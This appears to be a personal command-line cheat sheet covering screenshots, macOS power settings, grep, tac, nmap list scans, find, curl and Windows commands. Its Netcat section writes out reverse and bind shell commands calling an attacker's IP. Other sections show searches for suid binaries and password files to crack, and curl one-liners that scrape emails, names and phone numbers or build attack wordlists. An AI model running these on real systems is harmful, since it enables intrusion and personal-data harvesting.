# Screenshots
## OS X
- Command-Shift-3: Full screen to desktop
- Command-Shift-4, select an area: Area to desktop
- Command-Shift-4, space, click a window: Window to desktop
- Command-Control-Shift-3: Full screen to clipboard
- Command-Control-Shift-4, select an area: Area to clipboard
- Command-Control-Shift-4, space, click a window: Window to clipboard

## Windows
- PrtScr: full screenshot to clipboard
- Windows-PrtScr: full screen to "Screenshots" folder
- Alt-PrtScr: active window to clipboard


# OS X Power Saving
- Temporarily turn off sleep
```
sudo pmset noidle
```

- Turn off sleep
```
sudo pmset sleep 0
```

- Sleep after 15 minutes
```
sudo pmset sleep 15
```

# Netcat
- Reverse shell
```
On attacking machine: nc -lp PORT
On target machine: nc -e /bin/sh IP.OF.ATTACKER PORT
```

- When -e flag does not exist:
```
On attacking machine: nc -lp PORT

On target machine:
mknod /tmp/datapipe p
/bin/bash 0</tmp/datapipe | nc IP.OF.ATTACKER PORT 1>/tmp/datapipe
```

- Bind a shell to a port:
```
nc -lp PORT -e /bin/sh
```

# grep
- Multiple search terms:
```
grep -e term1 -e term2 <file>
```

- Exclude term:
```
grep -v term <file>
```

- Exclude multiple terms:
```
grep -v -e term1 -e term2 <file>
```

- Print file names and line numbers for matches:
```
grep -Hn term
```

- Case insensitive:
```
grep -i term <file>
```

- Strip # comments:
```
grep -v "^#" <file>
```

- Strip ; comments:
```
grep -v "^;" <file>
```

# tac (backwards cat)

This is part of the *GNU coreutils* package. It reads and prints a
file from the bottom up. VERY useful for logfiles.

- Linux
```
tac logfile | less
```

- OS X / BSD
```
gtac logfile | less
```

- BSD *tail -r*
```
tail -r logfile | less
```

# Using Nmap to generate lists of IP addresses

- Sometimes a tool will not allow you use CIDR notation to express
  network addresses, or will require you to provide it a list of IP
  addresses. Nmap provides the -sL (list scan) option that can generate
  these lists easily, complete with host and network exclusion, ranges,
  and so on:

```
nmap -n -sL 10.10.0.0/22 10.100.0.32/27 192.168.0.2-254 \
            --exclude 192.168.0.250,10.10.0.3.254       \
            | grep "Nmap scan report for"               \
            | awk {'print $5'}
```

- You can also omit the -n flag and easily resolve ranges of IP
  addresses. If an IP address resolves, it will display "hostname (ip
  address)". If it does not resolve, it will simply display the IP
  address:

```
nmap -sL 10.10.0.0/22 | awk {'print $5, $6'}
```

- Sometimes, you may need to use a different DNS server rather than
  whatever is in your /etc/resolv.conf to mass resolve a list of IPs:

```
nmap -n -sL 10.10.0.0/24      \
| grep "Nmap scan report for" \
| awk {'print $5'}            \
| while read ip; 
   do host $ip ALTERNATEDNSSERVERGOESHERE | grep "domain name pointer";
done
```

# find

- Find suid binaries:
```
find / -perm -04000 -exec ls -l {} \; 2>/dev/null
```

- Find world-writable files:
```
find / -type f -perm -o=w -exec ls -l {} \; 2>/dev/null
```

- Find world-writable directories:
```
find / -type d -perm -o=w -exec ls -l {} \; 2>/dev/null
```

- Find files with "passwd" in their names. This throws up a lot of
  false positives in most cases, but sometimes you can find a readable
  hashes to crack:
```
find / -name "*passwd*" -type f -exec ls -l {} \; 2>/dev/null
```

- Find files modified today and this week respectively:
```
find / -mtime -1 -exec ls -l {} \; 2>/dev/null
find / -mtime -7 -exec ls -l {} \; 2>/dev/null
```


# curl

- Get HTTP headers from a site:
```
curl -I http://www.google.com
```

- Display info about your public IP:
```
curl ipinfo.io
```

- Extract email addresses from URL:
```
curl http://www.foo.com/whatever.html 2>/dev/null        \
| grep -Eio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' \
| sort | uniq
```

- Extract anchors from URL (thanks bashitsu!). This is very useful for
  getting a basic layout of a site, fingerprinting software, and much
  more:
```
curl http://www.foo.com 2>/dev/null       \
| grep -Eio "(src|href) *= *[\"'][^\"']*" \
| grep -Eo "[\"'].*"                      \
| cut -c2- | sort | uniq
```

- Extract a set of unique words from a site. This is sometimes helpful
  in making dictionaries to attack a target with. This requires the
  'html2text' utility:
```
curl http://www.foo.com 2>/dev/null | html2text | tr " " "\n" | sort | uniq
```

- Attempt to pull names from a site. This isn't foolproof, as the
  output will still have to be scoured. (Thanks again, bashitsu!):
```
CAPWORD="([A-Z]{1}['a-z]+)";
curl http://www.foo.com 2>/dev/null        \
| grep -Eo -e "$CAPWORD $CAPWORD"          \
           -e "$CAPWORD [A-Z]{1} $CAPWORD" \
           -e "$CAPWORD $CAPWORD $CAPWORD" \
| sort | uniq -c
```

- Extract phone numbers from a site:
```
curl http://www.foo.com 2>/dev/null \
| html2text                         \
| grep -io '\(([0-9]\{3\})\|[0-9]\{3\}\)[ -.]\?[0-9]\{3\}[ -.]\?\([0-9]\{4\}\|[A-Z]\{4\}\)'
```

# Windows Platform Tokens

These strings are found in user agent strings in browsers amongst
other places and can be used to identify a machine's operating system:

| Platform Token  | Description                                   |
| --------------- | --------------------------------------------- |
| Windows NT 6.3  | Windows 8.1                                   |
| Windows NT 6.2  | Windows 8                                     |
| Windows NT 6.1  | Windows 7                                     |
| Windows NT 6.0  | Windows Vista                                 |
| Windows NT 5.2  | Windows Server 2003 or Windows XP x64 Edition |
| Windows NT 5.1  | Windows XP                                    |
| Windows NT 5.01 | Windows 2000 SP1                              |
| Windows NT 5.0  | Windows 2000                                  |
| Windows NT 4.0  | Microsoft Windows NT 4.0                      |
| Windows 98      | Windows ME (Millennium Edition)               |
| Win 9x 4.90     | Windows ME                                    |
| Windows 98      | Windows 98                                    |
| Windows 95      | Windows 95                                    |
| Windows CE      | Windows CE                                    |

Further reading:

- https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions
- https://msdn.microsoft.com/en-us/library/ms537503%28v=vs.85%29.aspx

# Command Line Equivalents from Linux to Windows

| Purpose      		    | Linux	  | Windows               |
| ------------------------- | ----------- | --------------------- |
| Directory list    	    | ls	  | dir                   |
| Display file's contents   | cat         | type                  |
| Display file with a pager | less file   | type file &#124; more |
| Copy file    	      	    | cp 	  | copy                  |
| Delete file		    | rm	  | del	                  |
| Rename file		    | mv	  | ren	                  |
| Show network interfaces   | ifconfig -a | ipconfig /all         |
| Show running processes    | ps          | tasklist              |
| Search for strings        | grep        | findstr &#124; find   |
| Terminate a process       | kill        | taskkill              |
| Change file attributes    | chmod       | attrib                |
| Clear screen              | clear       | cls                   |
| Compare files             | diff        | fc                    |
| Show disk usage           | df          | freedisk              |
| Show memory usage         | free        | mem                   |

Further reading on Windows command line nonsense:
- http://ss64.com/nt/
